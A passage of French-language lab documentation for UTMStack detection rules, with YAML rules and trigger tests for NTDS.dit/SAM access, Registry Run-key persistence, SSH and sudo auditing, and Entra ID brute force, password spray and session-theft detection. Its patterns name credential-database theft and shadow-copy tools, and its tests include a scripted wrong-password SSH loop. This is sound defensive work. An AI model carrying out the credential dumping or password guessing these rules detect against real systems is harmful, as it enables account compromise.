  - https://attack.mitre.org/techniques/T1003/003/
  - https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
description: 'Un processus a créé ou modifié un fichier dans le répertoire NTDS ou accédé à la base SAM (Sysmon EID 11). La base NTDS.dit contient tous les hashes de mots de passe du domaine, une copie non autorisée permet l''extraction offline de tous les credentials. Les accès légitimes de lsass.exe et du système sont exclus. Next Steps: 1. Identifier le processus accédant à NTDS via event.data.Image. 2. Vérifier si le fichier créé est ntds.dit ou une copie de celui-ci. 3. Rechercher une tentative de Volume Shadow Copy (vssadmin, wmic shadowcopy) dans la même fenêtre temporelle. 4. Isoler immédiatement le DC si un accès non autorisé est confirmé. 5. Réinitialiser le mot de passe krbtgt et tous les comptes privilégiés.'
where: |-
  equals("event.eventCode", 11) &&
  contains("event.channel", "Sysmon") &&
  (
    contains("event.data.TargetFilename", "\\NTDS\\") ||
    contains("event.data.TargetFilename", "ntds.dit") ||
    contains("event.data.TargetFilename", "\\SAM") ||
    contains("event.data.TargetFilename", "\\SYSTEM") ||
    contains("event.data.TargetFilename", "\\SECURITY")
  ) &&
  !contains("event.data.Image", "lsass.exe") &&
  !equals("event.data.Image", "System")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Correction en v11.3.0 :** la version v11.2 utilisait `!contains("event.data.Image", "System")` pour exclure le processus System. Ce filtre excluait aussi tout `C:\Windows\System32\`, donc `ntdsutil`, `esentutl`, `vssadmin` et `powershell`, c'est-à-dire précisément les outils qui servent à copier `ntds.dit`. Le test scripté l'a révélé. Il est remplacé par `!equals("event.data.Image", "System")`, qui ne vise que le processus System.

**Test de déclenchement**

Sur DC01-MAIN-SITE (contrôleur de domaine) depuis une invite de commande (`cmd.exe` : pas PowerShell) :

```cmd
echo test > C:\Temp\ntds.dit
del C:\Temp\ntds.dit
```

---

### S5 : Registry Run Key Persistence (EID 12/13)

Une valeur a été écrite ou supprimée dans une clé de démarrage automatique du registre. La règle couvre à la fois la création (EID 13 SetValue) et la suppression (EID 12 DeleteValue) : un attaquant qui nettoie sa persistance est également détecté.

**Technique MITRE :** T1547.001 · Registry Run Keys

⚠️ **Statut v11.3.0 :** inopérante dans le lab, la configuration Sysmon ne journalise pas les clés `Run` de HKCU. Conservée pour les configurations Sysmon qui les couvrent. Voir [S5b](#s5b--registry-run-key-persistence-security-4657), qui fonctionne sans Sysmon.

```yaml
name: S5 - Registry Run Key Persistence
dataTypes:
  - wineventlog
impact:
  confidentiality: 2
  integrity: 3
  availability: 2
category: Persistence
technique: T1547.001 - Boot or Logon Autostart Execution Registry Run Keys
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1547/001/
  - https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
description: 'Une valeur a été écrite dans une clé de démarrage automatique du registre (Sysmon EID 13). Les clés Run et RunOnce sont les vecteurs de persistance les plus utilisés, un exécutable référencé dans ces clés est lancé automatiquement à chaque démarrage ou connexion utilisateur. Les modifications effectuées par des processus système légitimes sont exclues. Next Steps: 1. Identifier la valeur ajoutée via event.data.Details. 2. Vérifier le chemin de l''exécutable référencé, un chemin dans Temp ou AppData est très suspect. 3. Identifier le processus ayant effectué la modification via event.data.Image. 4. Supprimer la valeur si non autorisée : Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "nom". 5. Analyser l''exécutable référencé (hash, VirusTotal).'
where: |-
  oneOf("event.eventCode", [12, 13]) &&
  contains("event.channel", "Sysmon") &&
  regexMatch("event.data.TargetObject", "(?i)\\\\(Run|RunOnce)\\\\") &&
  !regexMatch("event.data.Image", "(?i)\\\\(services|svchost|msiexec|trustedinstaller|tiworker)[.]exe$") &&
  !contains("event.data.Image", "Windows Defender") &&
  !contains("event.data.Image", "UTMStack")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

Depuis WIN11-AD-TESTS en PowerShell :

```powershell
# Écrire une valeur dans Run (EID 13)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "test-s5" -Value "C:\Temp\test.exe"

# Supprimer la valeur (EID 12)
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "test-s5"
```

---

## Série L : Linux (auditd)

Les règles L utilisent les événements auditd Linux collectés par l'agent UTMStack sur les machines Linux du lab (`docker-services` : `10.100.1.10`, Ubuntu 26.04). Les fichiers YAML sont disponibles dans [`rules/linux/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules/linux).

### Découverte technique importante

En v11.2, nos règles Linux fondées sur le texte du message (`message`, `contains("raw", "...")`) ne se déclenchaient pas, alors que le texte recherché était bien présent. Nous en avions conclu que le moteur n'évaluait pas ces champs. Ce constat est à nuancer : en v11.3.0, la règle de heartbeat du [chapitre 09](09-pipeline-llm.html) utilise `contains("raw", …)` sur des événements syslog et se déclenche. Le cas des événements Linux n'a pas été retesté.

Les règles L restent fondées sur les champs **auditd structurés** (`action`, `event.userauth.*`) : ils ne dépendent pas de la formulation des messages de `auth.log`, qui change d'une version d'OpenSSH ou de distribution à l'autre.

---

### L1 : SSH Authentication Failure

Un échec d'authentification SSH a été détecté via les événements auditd (`USER_AUTH fail`).

**Technique MITRE :** T1110.001 · Password Guessing

✅ **Statut v11.3.0 :** validée. Sur Ubuntu 26.04, le processus s'appelle `sshd-session` ; la regex `sshd` le couvre.

```yaml
name: L1 - SSH Authentication Failure
dataTypes:
  - linux
impact:
  confidentiality: 2
  integrity: 2
  availability: 1
category: Authentication
technique: T1110.001 - Brute Force Password Guessing
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1110/001/
description: 'Un échec d''authentification SSH a été détecté sur un serveur Linux via les events auditd (USER_AUTH fail). Détecte les tentatives d''authentification SSH échouées sur les comptes valides et invalides. Next Steps: 1. Identifier l''adresse IP source via event.userauth.addr. 2. Vérifier si plusieurs échecs proviennent de la même IP. 3. Bloquer l''IP source si le pattern est confirmé (fail2ban, CrowdSec). 4. Vérifier si une connexion réussie a suivi les échecs. 5. Auditer les comptes valides sur la machine cible.'
where: |-
  equals("action", "USER_AUTH") &&
  contains("event.userauth.result", "fail") &&
  regexMatch("event.userauth.exe", "(?i)sshd")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

Depuis n'importe quelle machine du lab, tenter une connexion SSH avec des credentials incorrects :

```bash
ssh utilisateur_inexistant@10.100.1.10
# ou plusieurs tentatives avec mauvais mot de passe
for i in $(seq 1 5); do sshpass -p "mauvais" ssh -o StrictHostKeyChecking=no demo@10.100.1.10; done
```

---

### L2 : Sudo Command Execution

Une commande a été exécutée avec des privilèges root via sudo.

**Technique MITRE :** T1548.003 · Sudo and Sudo Caching

✅ **Statut v11.3.0 :** validée.

```yaml
name: L2 - Sudo Command Execution
dataTypes:
  - linux
impact:
  confidentiality: 2
  integrity: 3
  availability: 2
category: Privilege Escalation
technique: T1548.003 - Abuse Elevation Control Mechanism Sudo and Sudo Caching
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1548/003/
description: 'Une commande a été exécutée avec des privilèges root via sudo sur un serveur Linux (auditd USER_AUTH success sudo). Toute exécution sudo doit être tracée et vérifiée. Next Steps: 1. Identifier le compte via event.userauth.acct. 2. Vérifier si la commande est autorisée. 3. Contrôler les connexions SSH récentes depuis le même compte. 4. Vérifier si le compte est dans sudoers de manière légitime. 5. Révoquer les droits sudo si non autorisé.'
where: |-
  equals("action", "USER_AUTH") &&
  contains("event.userauth.result", "success") &&
  regexMatch("event.userauth.exe", "(?i)sudo")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement**

Sur la machine `docker-services` (`10.100.1.10`), depuis une session SSH :

```bash
sudo whoami
# ou toute autre commande sudo
sudo systemctl status docker
```

---

## Série M : Microsoft 365 et Entra ID

Les règles M couvrent les événements Microsoft 365 collectés via l'API Office 365 Management Activity et indexés dans `v11-log-o365-*` avec `dataType = o365`. L'index contient les journaux d'audit unifiés : connexions Entra ID, opérations Exchange, SharePoint, Teams, et les events Purview DLP et MDE remontés via l'API O365.

### Découvertes techniques importantes

**`event.Workload`** : en v11.2, ce champ était indexé en `text`, d'où l'usage de `contains()` plutôt que `equals()` dans nos règles. Cette forme fonctionne toujours en v11.3.0. Pour compter les événements par workload dans OpenSearch, utiliser `utm.*` ou une requête `term` par valeur : `event.*` n'est pas agrégeable.

**`UserKey`** : la `UserKey` d'un événement Exchange (PUID) n'est pas celle d'un événement Entra ID (ID d'objet) pour le même compte. Pour relier deux workloads, passer par l'UPN (`origin.user`). Et `origin.user` lui-même n'est pas homogène : selon l'étape de connexion, il contient l'UPN, un GUID ou « Not Available ».

**`actionResult` paradoxal** : les events `UserLoginFailed` ont `actionResult = "Success"` car l'API a traité la requête correctement, même si l'authentification a échoué. C'est le champ `event.LogonError` qui indique le motif d'échec.

**`event.LogonError`** : présent uniquement sur certains events `UserLoginFailed` selon le motif d'échec fourni par Microsoft dans le payload. Absent des events de type reprocessing MFA (`ErrorNumber 9002341`) qui correspondent à des flux d'authentification intermédiaires MDE/Intune.

**`event.ExternalAccess`** : booléen natif dans OpenSearch. Utiliser `equals("event.ExternalAccess", true)` sans guillemets sur la valeur booléenne.

### Règles existantes en dépôt : documentation complète

Les cinq règles suivantes ont été créées lors des sessions initiales et sont disponibles dans [`rules/microsoft-365/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules/microsoft-365).

---

### Entra ID : Brute Force Password Attack

Alerte sur chaque échec de connexion Entra ID avec le code d'erreur `InvalidUserNameOrPassword` (ErrorNumber 50126). Plusieurs alertes successives sur un même compte signalent une attaque par force brute ciblant ce compte.

**Distinction avec le password spray :** le brute force cible un compte unique avec de nombreux mots de passe. Le password spray cible de nombreux comptes avec un seul mot de passe courant pour éviter le verrouillage. Les deux règles partagent le même filtre YAML : le discriminant est dans l'investigation : brute force = concentration sur un seul `origin.user`, password spray = dispersion sur plusieurs `origin.user` depuis un même `origin.ip`.

**Technique MITRE :** T1110.001 · Brute Force: Password Guessing

✅ **Statut v11.3.0 :** validée. En v11.2, Brute Force et Password Spray avaient une définition identique et déclenchaient sur chaque échec. Le seuil est désormais porté par `afterEvents` : 5 échecs du même compte en 10 minutes.

```yaml
name: Entra ID - Brute Force Password Attack
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 2
  availability: 1
category: Credential Access
technique: T1110.001 - Brute Force Password Guessing
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1110/001/
  - https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-sign-ins
description: 'Au moins 5 échecs de connexion Entra ID avec le code d''erreur InvalidUserNameOrPassword (ErrorNumber 50126) sur un même compte en 10 minutes. Ce volume sur un seul compte indique une attaque par force brute sur le mot de passe, une faute de frappe isolée ne déclenche pas la règle. Next Steps: 1. Identifier le compte ciblé via origin.user. 2. Vérifier l''IP source via origin.ip, une IP externe inconnue est suspecte. 3. Vérifier si une connexion réussie (UserLoggedIn) a suivi les échecs. 4. Contrôler l''état de verrouillage du compte dans Entra ID. 5. Réinitialiser le mot de passe et révoquer les sessions si une compromission est suspectée.'
where: |-
  oneOf("action", ["UserLoginFailed"]) &&
  oneOf("event.Workload", ["AzureActiveDirectory"]) &&
  oneOf("event.LogonError", ["InvalidUserNameOrPassword"])
afterEvents:
  - indexPattern: v11-log-o365-*
    with:
      - field: origin.user.keyword
        operator: filter_term
        value: "{{.origin.user}}"
      - field: action.keyword
        operator: filter_term
        value: UserLoginFailed
      - field: event.LogonError
        operator: filter_term
        value: InvalidUserNameOrPassword
    or: null
    within: 10m
    count: 5
groupBy: []
deduplicateBy: []
```

**Note sur `oneOf()` :** la syntaxe `oneOf("champ", ["valeur"])` avec un seul élément dans la liste est équivalente à `equals()`. Elle a été retenue ici pour cohérence avec des règles qui pourraient étendre la liste à plusieurs valeurs.

**Test de déclenchement :** depuis WIN11-AD-TESTS, ouvrir une fenêtre de navigation privée et se connecter à `portal.office.com` avec `demo@lan.local` et un mauvais mot de passe plusieurs fois de suite. L'event `UserLoginFailed` avec `event.LogonError = InvalidUserNameOrPassword` est généré dans les logs O365 (latence ~5-10 minutes).

---

### Entra ID : Password Spray Attack

Détecte une attaque par password spray : un même mot de passe testé sur de nombreux comptes depuis la même IP source pour éviter le verrouillage de compte. Contrairement au brute force, le password spray passe souvent sous le seuil de verrouillage par compte.

**Note :** le filtre YAML est identique à la règle brute force. La distinction est dans l'investigation : chercher dans l'alerte si plusieurs `origin.user` distincts ont échoué depuis le même `origin.ip` dans une courte fenêtre temporelle.

**Technique MITRE :** T1110.003 · Brute Force: Password Spraying

✅ **Statut v11.3.0 :** validée. Seuil porté par `afterEvents` : 10 échecs depuis la même adresse IP en 30 minutes.

```yaml
name: Entra ID - Password Spray Attack
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 2
  availability: 1
category: Credential Access
technique: T1110.003 - Brute Force Password Spraying
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1110/003/
  - https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-sign-ins
description: 'Au moins 10 échecs de connexion Entra ID avec le code d''erreur InvalidUserNameOrPassword depuis une même IP source en 30 minutes. Le password spray teste un mot de passe courant sur de nombreux comptes pour éviter le verrouillage. Le moteur ne compte pas les utilisateurs distincts : le seuil porte sur l''IP source, l''investigation confirme si plusieurs comptes sont visés. Next Steps: 1. Identifier l''IP source via origin.ip et sa réputation. 2. Lister les comptes ayant échoué depuis cette IP dans la fenêtre. 3. Vérifier si une connexion réussie a suivi depuis la même IP. 4. Bloquer l''IP via une politique d''accès conditionnel (emplacement nommé). 5. Forcer la réinitialisation des mots de passe des comptes visés si une connexion a réussi.'
where: |-
  oneOf("action", ["UserLoginFailed"]) &&
  oneOf("event.Workload", ["AzureActiveDirectory"]) &&
  oneOf("event.LogonError", ["InvalidUserNameOrPassword"])
afterEvents:
  - indexPattern: v11-log-o365-*
    with:
      - field: origin.ip.keyword
        operator: filter_term
        value: "{{.origin.ip}}"
      - field: action.keyword
        operator: filter_term
        value: UserLoginFailed
      - field: event.LogonError
        operator: filter_term
        value: InvalidUserNameOrPassword
    or: null
    within: 30m
    count: 10
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** depuis une même machine, tenter de se connecter successivement avec plusieurs comptes distincts (`demo@lan.local`, `test-m7@lan.local`) avec un mauvais mot de passe commun. L'investigation post-alerte confirme le pattern spray via la concentration d'`origin.ip` identique sur des `origin.user` multiples.

---

### Entra ID : Impossible Travel Detection

Connexion réussie depuis un pays différent de la connexion précédente dans une fenêtre de 2 heures pour le même utilisateur. Signal d'un vol de cookie de session (AiTM) ou d'une connexion depuis un pays étranger non autorisé.

La règle utilise le mécanisme `afterEvents` d'UTMStack : à chaque `UserLoggedIn` géolocalisé, elle cherche dans les 2 heures précédentes une connexion réussie du même compte depuis un autre pays.

**Technique MITRE :** T1078 · Valid Accounts

✅ **Statut v11.3.0 :** validée par un test avec un VPN, après deux corrections (voir plus bas). Un angle mort subsiste, compensé par la règle Mailbox Activity.

```yaml
name: Entra ID - Impossible Travel Detection
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Initial Access
technique: T1078 - Valid Accounts
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1078/
  - https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-sign-ins
  - https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks
description: 'Détecte une connexion réussie depuis un pays différent du pays de la connexion précédente dans une fenêtre de 2 heures pour le même utilisateur. Ce pattern indique soit un vol de token de session (attaque AiTM via Evilginx/Modlishka), soit une connexion non autorisée depuis un pays étranger. Note : avec Entra ID P1, cette détection est réalisée par UTMStack via corrélation des logs O365. Entra ID P2 (Identity Protection), avec Defender for Cloud Apps, offre une détection native avec scoring de risque. Next Steps: 1. Vérifier si le déplacement géographique est physiquement possible dans la fenêtre temporelle. 2. Contacter l''utilisateur pour confirmer si les deux connexions sont légitimes. 3. Si compromission suspectée : révoquer toutes les sessions actives via Entra ID. 4. Vérifier les activités post-connexion (accès fichiers, emails, modifications de configuration). 5. Contrôler si des règles inbox ou des modifications de compte ont été effectuées.'
where: |-
  oneOf("action", ["UserLoggedIn"]) &&
  oneOf("event.Workload", ["AzureActiveDirectory"]) &&
  exists("origin.geolocation.countryCode") &&
  exists("event.UserKey") &&
  !equals("origin.user", "Not Available")
afterEvents:
  - indexPattern: v11-log-o365-*
    with:
      - field: event.UserKey
        operator: filter_term
        value: "{{.event.UserKey}}"
      - field: action.keyword
        operator: filter_term
        value: UserLoggedIn
      - field: origin.geolocation.countryCode.keyword
        operator: must_not_term
        value: "{{.origin.geolocation.countryCode}}"
    or: null
    within: 2h
    count: 1
groupBy: []
deduplicateBy: []
```

**Corrections en v11.3.0 :**

- les champs du `afterEvents` passent en `.keyword` (`action.keyword`, `origin.geolocation.countryCode.keyword`) : sur un champ texte, `filter_term` ne matche jamais ;
- la corrélation se fait sur `event.UserKey` et non plus sur `origin.user`. Pour une même connexion, O365 produit plusieurs événements `UserLoggedIn` (une étape par facteur), et `origin.user` y vaut tantôt l'UPN, tantôt un GUID, tantôt « Not Available ». Les étapes « Not Available » sont exclues dans le `where`.

**Test de déclenchement :** se connecter à `portal.office.com` normalement, puis depuis un VPN positionné dans un autre pays, dans les 2 heures. Dans le lab, le test (Suisse, puis Pays-Bas) a produit 10 alertes, une par étape de la connexion étrangère.

**Angle mort : les lots O365.** `afterEvents` ne cherche que dans les événements déjà indexés. Or O365 livre ses journaux par lots. Quand la connexion légitime et la connexion étrangère arrivent **dans le même lot**, aucune ne voit l'autre et la règle ne se déclenche pas. Constaté dans le lab : 10 alertes quand les deux connexions sont arrivées en deux lots séparés de 11 minutes, aucune quand toutes les étapes sont arrivées ensemble. L'angle mort est aléatoire. Attendre ne le corrige pas : dans le scénario d'un vol de cookie, c'est justement la rapidité de l'attaquant qui place les deux connexions dans le même lot. La règle suivante le compense.

---

### O365 : Mailbox Activity From Another Country Than Recent Sign-In

Un accès à la boîte aux lettres (`MailItemsAccessed`) a lieu depuis un pays différent de celui d'une connexion réussie du même compte dans les 2 heures précédentes.

Cette règle complète Impossible Travel. L'activité dans la messagerie arrive forcément dans un lot O365 postérieur à la connexion qui l'a précédée : elle échappe donc à l'angle mort des lots. Elle couvre aussi le rejeu d'un cookie de session volé, qui produit de l'activité sans nouvelle connexion.

**Technique MITRE :** T1539 · Steal Web Session Cookie

✅ **Statut v11.3.0 :** nouvelle règle, validée au premier test (VPN aux Pays-Bas, Outlook sur le web).

```yaml
name: O365 - Mailbox Activity From Another Country Than Recent Sign-In
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 2
  availability: 1
category: Credential Access
technique: T1539 - Steal Web Session Cookie
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1539/
  - https://learn.microsoft.com/en-us/purview/audit-log-investigate-accounts
description: 'Accès à une boîte aux lettres (MailItemsAccessed) depuis un pays différent de celui d''une connexion réussie du même compte dans les 2 heures précédentes. Complète la règle Impossible Travel : l''activité arrive dans un lot O365 postérieur à la connexion, ce qui évite l''angle mort des connexions livrées dans le même lot, et couvre le rejeu d''un cookie de session sans nouvelle connexion. Seuls les événements portant une IP cliente géolocalisée sont évalués (les IP internes de Microsoft ne le sont pas). Next Steps: 1. Identifier le compte via origin.user et l''IP via origin.ip. 2. Comparer avec les connexions réussies récentes du compte (pays, IP, appareil). 3. Vérifier si le SessionId de la session est le même dans les deux pays, signe d''un vol de cookie. 4. Révoquer les sessions du compte dans Entra ID et réinitialiser le mot de passe si l''accès est illégitime. 5. Rechercher les règles de boîte aux lettres ou transferts créés pendant la session.'
where: |-
  equals("action", "MailItemsAccessed") &&
  contains("event.Workload", "Exchange") &&
  exists("origin.geolocation.countryCode") &&
  exists("origin.user") &&
  !equals("origin.user", "Not Available")
afterEvents:
  - indexPattern: v11-log-o365-*
    with:
      - field: origin.user.keyword
        operator: filter_term
        value: "{{.origin.user}}"
      - field: action.keyword
        operator: filter_term
        value: UserLoggedIn
      - field: origin.geolocation.countryCode.keyword
        operator: must_not_term
        value: "{{.origin.geolocation.countryCode}}"
    or: null
    within: 2h
    count: 1
groupBy: []
deduplicateBy: []
```

**Pourquoi `origin.user` et pas `event.UserKey` :** la `UserKey` d'un événement Exchange (PUID) n'est pas celle de l'événement de connexion Entra ID (ID d'objet). Les deux workloads se relient par l'UPN, que `origin.user` contient sur les événements `MailItemsAccessed`.

**Limites :** la règle ne voit que la messagerie. Seuls les accès qui portent une adresse IP cliente géolocalisée sont évalués : les accès internes de Microsoft (synchronisation, services) n'en portent pas.

**Test de déclenchement :** se connecter normalement à Outlook sur le web, puis, dans les 2 heures, rouvrir Outlook sur le web depuis un VPN positionné dans un autre pays et ouvrir quelques messages.

---

### Purview DLP : Sensitive Data Policy Match

> 🗄️ **Retirée en v11.3.0.** Couverte par la règle native 806 « Data Loss Prevention Policy Violation », qui traite `DLPRuleMatch`, `DlpPolicyMatch` et `DLPRuleUndo` (contournement avec justification) sur Exchange, SharePoint, OneDrive, Teams et Security & Compliance. Le fichier reste disponible dans [`rules/retirees/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules/retirees) pour les environnements où cette règle native n'existe pas.

Une règle DLP Microsoft Purview a détecté des données sensibles dans un fichier OneDrive, SharePoint ou un email Exchange. Couvre tous les workloads DLP (Exchange, SharePoint, Teams) via le `regexMatch` insensible à la casse qui capture les deux formes du libellé O365 (`DLPRuleMatch` et `DlpRuleMatch`).

> **Voir section "La boucle DLP" ci-dessous** : sans correction de l'adresse de notification UTMStack, chaque alerte peut générer une nouvelle alerte en boucle.

**Technique MITRE :** T1567 · Exfiltration Over Web Service

```yaml
name: Purview DLP - Sensitive Data Policy Match
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 2
  availability: 1
category: Data Loss Prevention
technique: T1567 - Exfiltration Over Web Service
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1567/
  - https://learn.microsoft.com/en-us/purview/dlp-learn-about-dlp
  - https://learn.microsoft.com/en-us/purview/dlp-policy-reference
description: 'Une règle DLP Microsoft Purview a détecté des données sensibles (numéro AVS, données personnelles, informations confidentielles) dans un fichier OneDrive, SharePoint ou Exchange. L''événement indique qu''un utilisateur a tenté d''accéder ou de partager un document contenant des informations protégées par les politiques nLPD/RGPD. Vérifier le fichier concerné via event.SharePointMetaData.FileName et la politique déclenchée via event.PolicyDetails. Next Steps: 1. Identifier la politique DLP déclenchée via event.PolicyDetails. 2. Identifier le fichier ou l''email source. 3. Vérifier si le partage était autorisé. 4. Contacter l''utilisateur si le partage semble involontaire. 5. Documenter l''incident dans le registre de traitement nLPD si des données personnelles sont impliquées.'
where: |-
  regexMatch("action", "(?i)dlprulematch")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Note :** contrairement à M11 (`Purview - DLP Rule Match Detected`) qui filtre sur `Workload Exchange`, cette règle ne filtre pas sur le workload : elle couvre Exchange, SharePoint et Teams simultanément. Le `regexMatch` avec `(?i)` est le discriminant principal.

**Test de déclenchement :** envoyer depuis `demo@lan.local` vers une adresse externe un email contenant des données couvertes par la politique DLP active (dans ce lab : numéros AVS). Exchange génère l'event `DLPRuleMatch` (ou `DlpRuleMatch` selon la version) avec `event.PolicyDetails` contenant la politique déclenchée.

---

### MDE Endpoint : Malware File Deleted by Defender

MDE a supprimé un fichier suspect sur un endpoint enrollé. Les suppressions manuelles (Explorer, OneDrive, Teams) et les nettoyages système (WER, MeasuredBoot) sont exclus. Seules les suppressions effectuées directement par MDE (sans application connue comme vecteur) déclenchent l'alerte.

**Technique MITRE :** T1204.002 · User Execution: Malicious File (approximation : la suppression est faite par Defender, pas par l'attaquant)

⚠️ **Statut v11.3.0 :** sans source dans le lab, aucun poste n'est intégré à MDE. Le workload `Endpoint` semble correspondre à Endpoint DLP, à vérifier.

```yaml
name: MDE Endpoint - Malware File Deleted by Defender
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Malware Defense
technique: T1204.002 - User Execution Malicious File
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1204/002/
  - https://learn.microsoft.com/en-us/microsoft-365/compliance/audit-log-activities
description: 'MDE a supprimé un fichier suspect sur un endpoint enrollé via l''API Office 365 Management (Workload: Endpoint, RecordType: 63). Les suppressions manuelles via Explorer, les nettoyages système (WER, MeasuredBoot) et les suppressions par le client OneDrive sont exclus. Consulter security.microsoft.com pour les détails de la détection. Next Steps: 1. Identifier le fichier supprimé via event.ObjectId. 2. Identifier le device via event.DeviceName et event.MDATPDeviceId. 3. Consulter l''alerte correspondante dans security.microsoft.com. 4. Vérifier si d''autres fichiers suspects ont été détectés sur le même device. 5. Isoler le device si une compromission active est suspectée.'
where: |-
  oneOf("action", ["FileDeleted"]) &&
  oneOf("event.Workload", ["Endpoint"]) &&
  !contains("event.ObjectId", "\\WER\\Temp\\") &&
  !contains("event.ObjectId", "\\Windows\\Logs\\MeasuredBoot\\") &&
  !equals("event.Application", "explorer.exe") &&
  !equals("event.Application", "OneDrive.exe") &&
  !equals("event.Application", "Teams.exe") &&
  !equals("event.Application", "taskhostw.exe")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** télécharger le fichier EICAR sur un endpoint MDE enrollé. MDE détecte la menace, la met en quarantaine (suppression effective du fichier), et génère l'event `FileDeleted` avec `event.Workload = Endpoint` dans les logs O365 (latence ~5 minutes). Corréler avec WD1 (EID 1116) sur le même host pour la vue complète de l'incident.

### La boucle DLP : un anti-pattern de configuration documenté

Lors de la validation des règles M10 (Auto-Label) et M11 (DLP Rule Match), un phénomène de boucle d'alertes a été observé et mérite d'être expliqué en détail car il peut rapidement noyer un SOC sous des centaines d'alertes sans qu'une vraie menace soit présente.

**Le contexte :** les notifications d'alerte UTMStack sont configurées pour envoyer un email vers `demo.externe@gmail.com` : une adresse personnelle externe au tenant Microsoft 365. Quand une règle DLP se déclenche, UTMStack génère un email de notification vers cette adresse externe.

**La chaîne de causalité :**

1. Un email avec un document contenant des numéros AVS (numéro de sécurité sociale suisse) est envoyé vers `demo.externe@gmail.com`
2. La politique DLP `DLP-Protection-nLPD-demo` bloque l'email et génère un rapport d'incident
3. Ce rapport d'incident est lui-même envoyé par Exchange vers `demo.externe@gmail.com` : il contient en pièce jointe un fichier ZIP avec un CSV listant les données sensibles détectées, soit 480 occurrences de numéros AVS
4. La politique DLP scanne ce rapport et le bloque également : il contient les mêmes données sensibles
5. UTMStack génère une alerte sur ce nouveau blocage DLP et envoie une nouvelle notification vers `demo.externe@gmail.com`
6. Cette notification contient à nouveau des références aux données sensibles → retour à l'étape 4

La boucle tourne toutes les 5 minutes (cycle de réévaluation du moteur UTMStack), générant une paire d'alertes à chaque cycle. En parallèle, la règle M10 (AutoSensitivityLabelRuleMatch) s'active car Exchange tente d'appliquer automatiquement un label de confidentialité sur ces emails de rapport avant de les bloquer.

**Les acteurs visibles dans les alertes :**

- `notifications-utmstack@lan.local` : adresse d'expéditeur des notifications UTMStack
- `MipLabelsAgent` : service Exchange Online qui applique les labels automatiquement
- Des ID numériques (ex: `1153801140139386071`) : l'identifiant interne du service Exchange MipLabels

**La solution :** configurer les notifications d'alerte UTMStack vers une adresse interne au tenant (`demo@lan.local` plutôt qu'une adresse externe). Les emails internes ne sont pas soumis aux politiques DLP "externe" et la boucle disparaît immédiatement. Le changement se fait dans UTMStack → Settings → Notifications → Email destination.

**Ce que ça révèle sur la configuration DLP :** une politique DLP bien configurée exclut les emails de rapport d'incident de son propre scope. La boucle est un symptôme d'une politique qui s'applique à tous les emails sortants sans exception, y compris ses propres rapports. C'est un anti-pattern de configuration courant dans les environnements Purview nouvellement déployés.

---

### Protection contre le vol de session : Token Protection (Accès Conditionnel Entra ID)

Il est utile de situer le rôle des règles Impossible Travel et Mailbox Activity dans l'architecture de défense globale face aux attaques AiTM (Adversary-in-the-Middle).

Dans une attaque AiTM, un proxy malveillant se positionne entre l'utilisateur et le service Microsoft. L'utilisateur complète le MFA normalement, mais le proxy intercepte le cookie de session post-authentification. L'attaquant utilise ensuite ce cookie depuis un autre appareil pour accéder aux ressources sans jamais connaître le mot de passe ni posséder le facteur MFA.

La **Token Protection** est une politique d'Accès Conditionnel Entra ID (licence Entra ID P1, incluse dans Business Premium) qui lie les jetons de connexion à l'appareil sur lequel ils ont été émis : un jeton volé ne peut pas être rejoué depuis un autre appareil. **Limite importante :** selon Microsoft, la Token Protection ne prend en charge que les applications natives (Outlook, Teams, OneDrive, applications Office, etc.), pas les navigateurs. Elle ne protège donc pas contre le vol de cookie de navigateur par un proxy AiTM. Contre ce vecteur, la protection structurelle reste une méthode d'authentification résistante à l'hameçonnage (WHfB, passkeys FIDO2) : voir l'[annexe AiTM du bundle MVC](https://doit4everyone.github.io/mvc-nlpd-m365/aitm-cookie-hijacking/).

**Mise en place :** dans le portail Entra ID → Protection → Accès conditionnel → Nouvelle politique :
- **Utilisateurs** : Tous les utilisateurs (exclure le compte break-glass)
- **Ressources cibles** : Exchange Online + SharePoint Online (commencer par ces deux avant d'élargir)
- **Conditions → Applications clientes** : ne pas sélectionner Navigateur (Microsoft indique que cela peut bloquer des applications web comme Teams Web)
- **Session** → Exiger une protection des tokens : **Oui**
- **Mode** : Rapport uniquement dans un premier temps, puis Activé une fois les appareils non conformes identifiés

**Prérequis :** appareils Windows (ou Apple) inscrits ou enregistrés dans Entra ID. Microsoft liste plusieurs types d'appareils non pris en charge (hôtes Azure Virtual Desktop joints à Entra ID, Cloud PC Windows 365, appareils inscrits en masse, etc.) : tester en mode Rapport uniquement avant d'activer.

